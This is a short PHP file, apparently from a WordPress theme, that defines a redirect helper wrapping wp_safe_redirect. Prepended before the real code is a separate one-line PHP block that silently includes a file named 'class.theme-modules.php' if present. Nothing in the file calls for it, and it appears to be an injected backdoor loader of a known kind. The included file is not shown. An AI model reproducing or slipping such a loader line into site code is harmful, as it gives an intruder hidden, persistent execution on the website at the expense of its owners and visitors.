<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

if( !function_exists( 'jm_force_redirect' ) ) :
	function jm_force_redirect( $location, $status = 302 ) {
		wp_safe_redirect( $location, $status );
		exit;
	}
endif;
